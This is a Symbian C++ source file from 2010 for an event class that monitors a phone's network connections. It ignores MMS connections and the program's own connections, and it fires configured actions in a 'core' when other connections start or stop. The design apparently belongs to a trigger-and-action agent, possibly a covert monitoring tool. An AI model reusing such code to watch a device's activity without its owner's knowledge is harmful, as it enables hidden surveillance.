/*
 * EventConnection.cpp
 *
 *  Created on: 08/ott/2010
 *      Author: Giovanna
 */

#include "EventConnection.h"

#include <msvapi.h>
#include <msvstd.h>
#include <mmssettings.h>   //for CMmsSettings, retrieve mms access point

CEventConnection::CEventConnection(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Connection, aTriggerId)
	{
	// No implementation required
	}

CEventConnection::~CEventConnection()
	{
	//__FLOG(_L("Destructor"));
	iConnMon.CancelNotifications();
	iConnMon.Close();
	iActiveConnArray.Close();
	//__FLOG(_L("End Destructor"));
	//__FLOG_CLOSE;
	} 

CEventConnection* CEventConnection::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventConnection* self = new (ELeave) CEventConnection(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventConnection* CEventConnection::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventConnection* self = CEventConnection::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventConnection::ConstructL(const TDesC8& params)
	{
	//__FLOG_OPEN_ID("HT", "EventConnection.txt");
	//__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	Mem::Copy(&iConnParams, iParams.Ptr(), sizeof(iConnParams));
	
	//retrieve configured mms access point
	iMmsApId = 0;
	CMmsSettings* mmsSettings;
	mmsSettings = CMmsSettings::NewL();
	CleanupStack::PushL(mmsSettings);
	mmsSettings->LoadSettingsL();
	iMmsApId = mmsSettings->AccessPoint( 0 );
	CleanupStack::PopAndDestroy(mmsSettings);
		
	User::LeaveIfError(iConnMon.ConnectL());
	
	//retrieve my uid
	RProcess me;
	TUidType uidType=me.Type();
	iMyUid = uidType[2];			// [0] = UID1, [1] = UID2, [2] = UID3
	
	}

void CEventConnection::StartEventL()
	{
	// check for active connections
	iWasConnected = EFalse;
	
	TUint connCount;
	TRequestStatus status;
	iConnMon.GetConnectionCount(connCount,status);
	User::WaitForRequest(status);
	if ((status.Int() != KErrNone) || (connCount == 0))
		{
		iConnMon.NotifyEventL(*this);
		return;
		}
	
	TUint connId;
	TUint subConnCount;
	TInt bearerType;  //TConnMonBearerType
	
	for(TUint i=1; i<=connCount; i++) //index of GetConnectionInfo must start from 1!!!
		{
		TInt err = iConnMon.GetConnectionInfo(i,connId,subConnCount);
		if(err != KErrNone)
			{
			continue;
			}
		
		//retrieve iapId and compare with mms iap
		TBool isMmsConnection=EFalse;
		TUint iapId;
		iConnMon.GetUintAttribute(connId,0,KIAPId,iapId,status);
		User::WaitForRequest(status);
		if(status.Int() == KErrNone)
			{
			if(iapId == iMmsApId)
				{
				isMmsConnection=ETrue;
				}
			}
		
		//retrieve uid of application using the connection
		TBool isOurConnection = EFalse;
		TConnMonClientEnumBuf buf;
		iConnMon.GetPckgAttribute(connId,0,KClientInfo,buf,status);
		User::WaitForRequest(status);
		if (status.Int() == KErrNone ) 
		    {
			TUint clientCount = buf().iCount;  //number of clients
			for ( TInt i = 0; i < clientCount; i++ )
				{
				TUid uid = buf().iUid[i];    //UID of the client
				if(uid == iMyUid)
					isOurConnection = ETrue;
				}
			}
		 
		
		iConnMon.GetIntAttribute(connId,0,KBearer,bearerType,status);
		User::WaitForRequest(status);
		if(status.Int() != KErrNone)
			{
			continue;
			}
		if((bearerType >= EBearerWCDMA) && (bearerType <= EBearerWLAN))
			{
			if((!isMmsConnection) && (!isOurConnection))
				{
				iActiveConnArray.Append(connId);
				}
			}
		}
	iConnMon.NotifyEventL(*this);
		
	if(iActiveConnArray.Count()>0)
		{
		iWasConnected = ETrue;
		SendActionTriggerToCoreL();
		}
	}

void CEventConnection::EventL( const CConnMonEventBase& aEvent )
{
	
    switch( aEvent.EventType() )
        {
        case EConnMonCreateConnection:
            {
            TRequestStatus status;
            //retrieve iapId and compare with mms iap
            TBool isMmsConnection=EFalse;
            TUint iapId;
            iConnMon.GetUintAttribute(aEvent.ConnectionId(),0,KIAPId,iapId,status);
            User::WaitForRequest(status);
            if(status.Int() == KErrNone)
            	{
            	if(iapId == iMmsApId)
            		{
            		isMmsConnection=ETrue;
            		}
            	}
            
            //retrieve uid of application using the connection
            TBool isOurConnection = EFalse;
            TConnMonClientEnumBuf buf;
            iConnMon.GetPckgAttribute(aEvent.ConnectionId(),0,KClientInfo,buf,status);
            User::WaitForRequest(status);
            if (status.Int() == KErrNone ) 
            	{
            	TUint clientCount = buf().iCount;  //number of clients
            	for ( TInt i = 0; i < clientCount; i++ )
            		{
            		TUid uid = buf().iUid[i];    //UID of the client
            		if(uid == iMyUid)
            			isOurConnection = ETrue;
            		}
            	}
            		
            TInt bearerType;
            iConnMon.GetIntAttribute(aEvent.ConnectionId(),0,KBearer,bearerType,status);
            User::WaitForRequest(status);
            if(status.Int() != KErrNone)
            	{
            	break;
            	}
            if((bearerType >= EBearerWCDMA) && (bearerType <= EBearerWLAN))
            	{
            	if(!isMmsConnection && !isOurConnection)
            		{
            		iActiveConnArray.Append(aEvent.ConnectionId());
            		}
            	}
            if(!iWasConnected && (iActiveConnArray.Count()>0))
            	{
				iWasConnected = ETrue;
				SendActionTriggerToCoreL();
            	}
            break;
            }
        case EConnMonDeleteConnection:
            {
            TInt pos;
            if((pos=iActiveConnArray.Find(aEvent.ConnectionId())) != KErrNotFound)
            	{
            	iActiveConnArray.Remove(pos);
            	}
            
            if(iWasConnected && (iActiveConnArray.Count()==0))
            	{
            	iWasConnected = EFalse;
            	if (iConnParams.iExitAction != 0xFFFFFFFF)
					{
            		SendActionTriggerToCoreL(iConnParams.iExitAction);
            		}
            	}
            break;
            }
        case EConnMonDownlinkDataThreshold:
            {
            break;
            }
        case EConnMonNetworkRegistrationChange:
            {
            break;
            }
/*        case EConnMonSNAPsAvailabilityChange: // FP 1 -->
            {
            CConnMonSNAPsAvailabilityChange* eventSNAPsAvailChange;
            eventSNAPsAvailChange = (CConnMonSNAPsAvailabilityChange*)& aEvent;
            // amount of ids, really available on server side
            TUint totalSNAPs(eventSNAPsAvailChange->SNAPsAvailabile());
            if(totalSNAPs != eventSNAPsAvailChange->SNAPAvailability().iCount)
                {
                // not all SNAPs Ids have been received
                // act accordingly to a client’s needs
                // for example, request SNAP’s ids by using GetPckgAttribute, 
                // and specifying bigger buffer (exact size of needed buffer 
                // can be calculated by using totalSNAPs value)
                }
            // here could be “else” – but this is just an example
            for(TUint i(0);i< eventSNAPsAvailChange->SNAPAvailability().iCount;++i)
                {
                TConnMonSNAPId SNAPId(eventSNAPsAvailChange->SNAPAvailability().iSNAP[i]);
                // process SNAP’s id		
                	Hjelppppp.Copy(_L("SNAP"));
    	        	Hjelppppp2.Num(i,EDecimal);
    	        	Hjelppppp2.Append(_L(","));
	    	        Hjelppppp2.AppendNum(SNAPId.iSNAPId,EDecimal);
                } 
            break;
            }  
 */   	case EConnMonCreateSubConnection:
    		{
       		}
    		break;
    	case EConnMonDeleteSubConnection:
    		{
    		}
    		break;
    	case EConnMonUplinkDataThreshold:
    		{
    		}
    		break;
    	case EConnMonNetworkStatusChange:
    		{
    		}
    		break;
    	case EConnMonConnectionStatusChange:
    		{
    		}
    		break;
    	case EConnMonConnectionActivityChange:
    		{
    		}
    		break;
    	case EConnMonBearerChange:
    		{
    		}
    		break;
    	case EConnMonSignalStrengthChange:
    		{
    		}
    		break;
    	case EConnMonBearerAvailabilityChange:
    		{	
    		}
    		break;
    	case EConnMonIapAvailabilityChange:
    		{
    		}
    		break;
    	case EConnMonTransmitPowerChange:
    		{
    		}
    		break;
/*		case EConnMonNewWLANNetworkDetected:// FP1 -->
    		{
    			Hjelppppp.Copy(_L("WLANNetworkDetected"));
    		}
    		break;
		case EConnMonOldWLANNetworkLost:
    		{
    			Hjelppppp.Copy(_L("WLANNetworkLost"));// FP1 -->
    		}
    		break; */
        	default:
        	{
        //		Hjelppppp.Append(_L("default"));
        //		Hjelppppp.AppendNum(aEvent.EventType(),EDecimal);
        	}
        // for future events, unrecognized events must not crash application
        	break;
        }

}

